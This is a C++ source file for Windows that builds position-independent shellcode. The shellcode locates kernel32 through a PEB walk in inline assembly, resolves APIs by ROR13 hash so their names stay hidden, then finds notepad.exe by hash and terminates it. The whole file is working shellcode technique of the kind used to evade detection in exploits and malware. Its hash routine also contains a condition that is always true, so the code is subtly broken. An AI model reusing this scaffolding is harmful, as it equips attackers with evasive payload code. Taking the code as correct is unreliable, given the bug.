#include <windows.h>
#include <tlhelp32.h>

extern "C" HMODULE __fastcall find_kernel(void);
extern "C" FARPROC __fastcall find_function(HMODULE __kernel32, DWORD __hash);
extern "C" DWORD __fastcall ror13_hash(LPCSTR __string);

typedef HANDLE (WINAPI *createtoolhelp32snapshot_t)(DWORD, DWORD);
typedef BOOL (WINAPI *process32first_t)(HANDLE, LPPROCESSENTRY32);
typedef BOOL (WINAPI *process32next_t)(HANDLE, LPPROCESSENTRY32);
typedef HANDLE (WINAPI *openprocess_t)(DWORD, BOOL, DWORD);
typedef BOOL (WINAPI *terminateprocess_t)(HANDLE, UINT);
typedef VOID (WINAPI *exitprocess_t)(UINT);
typedef BOOL (WINAPI *closehandle_t)(HANDLE);

extern "C" VOID __fastcall _shellcode() {
  __asm nop;
  __asm nop;
  __asm nop;
  __asm nop;


   // Hash values:
  // 0x6661102f - CreateToolhelp32Snapshot
  // 0xc086ac6e - Process32First
  // 0xe5b35711 - Process32Next
  // 0x8e5f8b88 - OpenProcess
  // 0x6f22b47 - TerminateProcess
  // 0x125fcc46 - ExitProcess
  // 0xae7a8bc2 - CloseHandle
  // 0x7406d259 - notepad.exe

  HMODULE __kernel32;
  FARPROC __createToolhelp32Snapshot;
  FARPROC __process32First;
  FARPROC __process32Next;
  FARPROC __openProcess;
  FARPROC __terminateProcess;
  FARPROC __exitProcess;
  FARPROC __closeHandle;


  HANDLE __hSnapshot;
  HANDLE __hProcess;
  PROCESSENTRY32 __pe32;

  __kernel32 = find_kernel();

  __createToolhelp32Snapshot = find_function(__kernel32, 0x6661102f);
  __process32First = find_function(__kernel32, 0xc086ac6e);
  __process32Next = find_function(__kernel32, 0xe5b35711);
  __openProcess = find_function(__kernel32, 0x8e5f8b88);
  __terminateProcess = find_function(__kernel32, 0x6f22b47);
  __exitProcess = find_function(__kernel32, 0x125fcc46);
  __closeHandle = find_function(__kernel32, 0xae7a8bc2);

  __hSnapshot =
    ((createtoolhelp32snapshot_t)__createToolhelp32Snapshot)(TH32CS_SNAPPROCESS, 0);

  if (__hSnapshot == INVALID_HANDLE_VALUE) {
    ((exitprocess_t)__exitProcess)(-1);
  }

  __pe32.dwSize = sizeof(__pe32);

  if (!((process32first_t)__process32First)(__hSnapshot, &__pe32)) {
    ((closehandle_t)__closeHandle)(__hSnapshot);
    ((exitprocess_t)__exitProcess)(-2);
  }

  do {
    if (ror13_hash(__pe32.szExeFile) == 0x7406d259) {
      __hProcess = ((openprocess_t)__openProcess)(
        PROCESS_TERMINATE,
        FALSE,
        __pe32.th32ProcessID
      );

      if (__hProcess == NULL) {
        ((closehandle_t)__closeHandle)(__hSnapshot);
        ((exitprocess_t)__exitProcess)(-3);
      }

      if (!((terminateprocess_t)__terminateProcess)(__hProcess, 0)) {
        ((closehandle_t)__closeHandle)(__hSnapshot);
        ((exitprocess_t)__exitProcess)(-4);
      }
      break;
    }
  } while (((process32next_t)__process32Next)(__hSnapshot, &__pe32));

  ((closehandle_t)__closeHandle)(__hSnapshot);
  ((exitprocess_t)__exitProcess)(0);
}

extern "C" HMODULE __fastcall find_kernel(void) {
  __asm {
    mov eax, fs:[0x30]
    mov eax, DWORD PTR[eax + 0xc]
    mov eax, DWORD PTR[eax + 0x14]
    mov eax, DWORD PTR[eax]
    mov eax, DWORD PTR[eax]
    mov eax, DWORD PTR[eax + 0x10]
  };
}

extern "C" FARPROC __fastcall find_function(HMODULE __module, DWORD __hash) {
  IMAGE_DOS_HEADER* __dosHeader;
  IMAGE_NT_HEADERS* __ntHeaders;
  IMAGE_EXPORT_DIRECTORY* __exportDir;
  DWORD* __names;
  DWORD* __funcs;
  WORD* __nameOrds;

  __dosHeader = (IMAGE_DOS_HEADER*)__module;
  __ntHeaders = (IMAGE_NT_HEADERS*)((char*)__module + __dosHeader->e_lfanew);
  __exportDir = (IMAGE_EXPORT_DIRECTORY*)((char*)__module
    + __ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
  __names = (DWORD*)((char*)__module + __exportDir->AddressOfNames);
  __funcs = (DWORD*)((char*)__module + __exportDir->AddressOfFunctions);
  __nameOrds = (WORD*)((char*)__module + __exportDir->AddressOfNameOrdinals);

  for (DWORD i = 0; i < __exportDir->NumberOfNames; ++i)
  {
    char* string = (char*)__module + __names[i];
    if (__hash == ror13_hash(string))
    {
      WORD nameord = __nameOrds[i];
      DWORD funcrva = __funcs[nameord];
      return (FARPROC)((char*)__module + funcrva);
    }
  }

  return NULL;
}

extern "C" DWORD __fastcall ror13_hash(LPCSTR __string) {
  DWORD __hash = 0x00;
  DWORD __val = 0x00;
  DWORD __shift = 0x20; // 'a' - 'A'

  while (*__string) {
    __val = (DWORD)*__string++;
    if (__val >= 0x61 || __val <= 0x7a) { __val -= __shift; }
    __hash = (__hash >> 0x0d) | (__hash << 0x13);
    __hash += __val;
  }

  return __hash;
}